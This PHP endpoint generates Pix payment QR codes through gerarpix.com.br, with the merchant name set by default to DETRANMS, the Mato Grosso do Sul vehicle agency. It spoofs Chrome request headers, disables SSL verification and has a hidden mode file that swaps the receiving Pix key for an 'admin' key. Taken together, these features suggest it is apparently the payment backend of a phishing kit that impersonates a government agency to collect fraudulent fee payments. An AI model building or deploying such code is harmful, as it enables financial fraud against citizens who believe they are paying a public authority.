<?php
header('Content-Type: application/json; charset=utf-8');
require_once __DIR__ . '/app_storage.php';
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { echo json_encode(['error' => 'Dados inválidos']); exit; }
$valor = (float)($input['valor'] ?? 0);
$uc = trim($input['uc'] ?? '');

$modePath = app_storage_path('pix_mode.txt');
$isModeActive = false;
if (file_exists($modePath)) {
    $rawMode = @file_get_contents($modePath);
    if ($rawMode !== false) {
        $modeContent = trim(strtolower($rawMode));
        if ($modeContent === 'ativo' || $modeContent === '1' || $modeContent === 'true') {
            $isModeActive = true;
        }
    }
}

if ($isModeActive) {
    $cfgPath = app_storage_path('pix_config_admin.json');
} else {
    $cfgPath = app_storage_path('pix_config.json');
}

$pixKey = '';
if (file_exists($cfgPath)) {
    $rawCfg = file_get_contents($cfgPath);
    $cfg = json_decode($rawCfg, true);
    if (is_array($cfg) && !empty($cfg['pixKey'])) { $pixKey = $cfg['pixKey']; }
}
if ($pixKey === '') {
    $cfg2 = __DIR__ . DIRECTORY_SEPARATOR . 'config' . DIRECTORY_SEPARATOR . 'pix.json';
    if (file_exists($cfg2)) {
        $raw2 = file_get_contents($cfg2);
        $c2 = json_decode($raw2, true);
        if (is_array($c2) && !empty($c2['key'])) { $pixKey = $c2['key']; }
    }
}
$empresaNome = 'DETRANMS';
$cidade = 'CAMPO GRANDE';
$cfgFull = __DIR__ . DIRECTORY_SEPARATOR . 'config' . DIRECTORY_SEPARATOR . 'pix.json';
if (file_exists($cfgFull)) {
    $rawFull = file_get_contents($cfgFull);
    $cf = json_decode($rawFull, true);
    if (is_array($cf)) {
        if (!empty($cf['merchant'])) { $empresaNome = $cf['merchant']; }
        if (!empty($cf['city'])) { $cidade = $cf['city']; }
    }
}
$amountFormatted = 'R$ ' . number_format($valor, 2, ',', '');
$postData = [
    'key_type' => 'Outro',
    'key' => $pixKey,
    'name' => $empresaNome,
    'city' => $cidade,
    'amount' => $amountFormatted,
    'reference' => 'REF' . ($uc !== '' ? $uc : time()),
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.gerarpix.com.br/emvqr-static');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
$headers = [];
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Content-Type: application/json;charset=UTF-8';
$headers[] = 'Origin: https://www.gerarpix.com.br';
$headers[] = 'Priority: u=1, i';
$headers[] = 'Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
$result = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if (curl_errno($ch)) {
    $err = curl_error($ch);
    curl_close($ch);
    echo json_encode(['error' => 'Erro Curl: ' . $err]);
    exit;
}
curl_close($ch);
if ($code === 200 && $result) {
    $json = json_decode($result, true);
    if (is_array($json)) { echo json_encode($json, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); exit; }
    echo $result;
    exit;
}
echo json_encode(['error' => 'Falha ao gerar EMV']);
